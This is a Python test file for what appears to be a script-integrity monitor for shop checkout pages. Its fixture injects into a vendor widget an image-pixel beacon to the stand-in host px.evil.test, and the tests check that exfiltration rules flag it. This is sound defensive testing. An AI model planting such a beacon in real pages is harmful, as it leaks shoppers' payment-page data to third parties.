from __future__ import annotations

import uuid

from fastapi.testclient import TestClient

from tests.conftest import FixtureSite

WIDGET = b"(function(){window.q=[];q.push('load');})();"


def _changed_shop(client: TestClient, site: FixtureSite, cdn: FixtureSite) -> dict[str, object]:
    """Scan a shop, change its vendor script and add an inline block; return the 2nd scan."""
    vendor = cdn.url("/sdk/widget.js")
    cdn.set("/sdk/widget.js", WIDGET, content_type="text/javascript")
    site.page("/checkout", f'<script src="{vendor}"></script><script>pay();</script>')
    client.post("/v1/sites", json={"name": "shop", "allowed_origins": [site.origin]})
    client.post("/v1/sites/shop/pages", json={"url": site.url("/checkout"), "payment_page": True})
    first = client.post("/v1/sites/shop/scans").json()
    assert (first["findings_new"], first["findings"]) == (0, [])
    cdn.set(
        "/sdk/widget.js",
        WIDGET.replace(b"'load'", b"'load');new Image().src=('https://px.evil.test/?'+1"),
        content_type="text/javascript",
    )
    site.page(
        "/checkout",
        f'<script>ab("B");</script><script src="{vendor}"></script><script>pay();</script>',
    )
    response = client.post("/v1/sites/shop/scans")
    assert response.status_code == 201, response.text
    scan: dict[str, object] = response.json()
    return scan


def test_scan_results_carry_findings(
    client: TestClient, fixture_site: FixtureSite, cdn: FixtureSite
) -> None:
    scan = _changed_shop(client, fixture_site, cdn)
    assert scan["findings_new"] == 2
    raised = scan["findings"]
    assert isinstance(raised, list)
    assert [(f["kind"], f["severity"]) for f in raised] == [
        ("script.changed", "critical"),
        ("script.added", "medium"),
    ]
    # The inserted block is a new script; pay() kept its identity.
    assert raised[1]["locator"] == fixture_site.url("/checkout#inline-2")
    again = client.get(f"/v1/scans/{scan['id']}").json()
    assert again["findings"] == raised
    listed = client.get("/v1/sites/shop/scans").json()["scans"]
    assert [s["findings_new"] for s in listed] == [2, 0]


def test_listing_reading_and_handling_findings(
    client: TestClient, fixture_site: FixtureSite, cdn: FixtureSite
) -> None:
    scan = _changed_shop(client, fixture_site, cdn)
    listed = client.get("/v1/sites/shop/findings").json()
    assert listed["site"] == "shop"
    assert len(listed["findings"]) == 2
    critical = client.get("/v1/sites/shop/findings", params={"min_severity": "high"}).json()
    [finding] = critical["findings"]
    assert finding["kind"] == "script.changed"
    assert client.get("/v1/sites/shop/findings", params={"scan_id": scan["id"], "limit": 1}).json()[
        "findings"
    ] == [finding]
    by_script = client.get(
        "/v1/sites/shop/findings", params={"script_id": finding["script_id"]}
    ).json()["findings"]
    assert [f["id"] for f in by_script] == [finding["id"]]

    detail = client.get(f"/v1/findings/{finding['id']}").json()
    assert detail["site"] == "shop"
    assert detail["detail"]["hosts_added"] == ["px.evil.test"]
    assert detail["detail"]["hunks"][0]["added"].startswith("new Image ( ) . src")
    assert detail["previous_version_id"] is not None

    base = f"/v1/findings/{finding['id']}"
    acked = client.post(f"{base}/acknowledge", json={"actor": "alice"}).json()
    assert (acked["status"], acked["status_changed_by"]) == ("acknowledged", "alice")
    missing_note = client.post(f"{base}/resolve", json={"actor": "alice"})
    assert missing_note.status_code == 422
    assert "needs a note" in missing_note.json()["detail"]
    resolved = client.post(
        f"{base}/resolve", json={"actor": "alice", "note": "Vendor compromise; tag removed."}
    ).json()
    assert resolved["status"] == "resolved"
    assert resolved["resolved_at"] is not None
    assert client.post(f"{base}/acknowledge", json={"actor": "bob"}).status_code == 422
    assert client.post(f"{base}/reopen", json={"actor": "bob"}).json()["status"] == "open"
    open_now = client.get("/v1/sites/shop/findings", params={"status": "open"}).json()
    assert len(open_now["findings"]) == 2
    assert client.post(f"{base}/reopen", json={"actor": "bob", "x": 1}).status_code == 422
    audit = client.get("/v1/sites/shop/audit", params={"limit": 3}).json()["events"]
    assert [e["action"] for e in audit] == [
        "finding.reopened",
        "finding.resolved",
        "finding.acknowledged",
    ]
    assert client.get("/v1/sites/shop/audit/verify").json()["ok"] is True

    assert client.get(f"/v1/findings/{uuid.uuid4()}").status_code == 404
    assert client.post(f"/v1/findings/{uuid.uuid4()}/reopen", json={"actor": "a"}).status_code == (
        404
    )
    assert client.get("/v1/sites/nope/findings").status_code == 404
    assert client.get("/v1/sites/shop/findings", params={"min_severity": "huge"}).status_code == (
        422
    )


def test_script_diff_endpoint(
    client: TestClient, fixture_site: FixtureSite, cdn: FixtureSite
) -> None:
    _changed_shop(client, fixture_site, cdn)
    scripts = client.get("/v1/sites/shop/scripts").json()["scripts"]
    vendor = next(s for s in scripts if s["kind"] == "external")
    base = f"/v1/sites/shop/scripts/{vendor['id']}/diff"
    body = client.get(base).json()
    assert body["locator"] == cdn.url("/sdk/widget.js")
    assert body["hosts_added"] == ["px.evil.test"]
    assert body["hunk_count"] == 1
    assert body["size"]["delta"] > 0
    assert body["tokens"]["removed"] == 0
    assert body["coarse"] is False
    old, new = body["from_version"], body["to_version"]
    flipped = client.get(base, params={"from": new["sha384"][:10], "to": old["id"]}).json()
    assert flipped["hosts_removed"] == ["px.evil.test"]
    assert client.get(base, params={"max_hunks": 1}).json()["hunk_count"] == 1
    assert client.get(base, params={"from": "zz"}).status_code == 422
    assert client.get(base, params={"from": "0" * 10}).status_code == 404
    inline = next(s for s in scripts if s["kind"] == "inline")
    only_one = client.get(f"/v1/sites/shop/scripts/{inline['id']}/diff")
    assert only_one.status_code == 422
    assert client.get(f"/v1/sites/shop/scripts/{uuid.uuid4()}/diff").status_code == 404
    # The diff carries what the new body does: an image pixel to another host.
    assert [s["rule"] for s in body["signals_added"]] == ["exfil.image"]
    assert [v["rule"] for v in body["verdicts"]] == ["exfil.outbound"]


def test_script_inspect_endpoint(
    client: TestClient, fixture_site: FixtureSite, cdn: FixtureSite
) -> None:
    _changed_shop(client, fixture_site, cdn)
    scripts = client.get("/v1/sites/shop/scripts").json()["scripts"]
    vendor = next(s for s in scripts if s["kind"] == "external")
    base = f"/v1/sites/shop/scripts/{vendor['id']}/inspect"
    body = client.get(base).json()
    assert body["locator"] == cdn.url("/sdk/widget.js")
    assert body["context"] == {"script_host": "127.0.0.1", "site_hosts": ["127.0.0.1"]}
    [signal] = body["signals"]
    assert (signal["rule"], signal["key"], signal["destination"]) == (
        "exfil.image",
        "px.evil.test",
        "literal",
    )
    assert body["worst"] == "low"
    assert body["hidden_hosts"] == []
    assert body["truncated"] is False
    versions = client.get(f"/v1/sites/shop/scripts/{vendor['id']}").json()["versions"]
    assert body["version"]["id"] == versions[0]["id"]  # the latest by default
    older = client.get(base, params={"version": versions[1]["sha384"][:10]}).json()
    assert (older["version"]["id"], older["signals"], older["worst"]) == (
        versions[1]["id"],
        [],
        None,
    )
    assert client.get(base, params={"version": "zz"}).status_code == 422
    assert client.get(f"/v1/sites/shop/scripts/{uuid.uuid4()}/inspect").status_code == 404
    inline = next(s for s in scripts if s["kind"] == "inline")
    clean = client.get(f"/v1/sites/shop/scripts/{inline['id']}/inspect").json()
    assert (clean["signals"], clean["verdicts"], clean["worst"]) == ([], [], None)
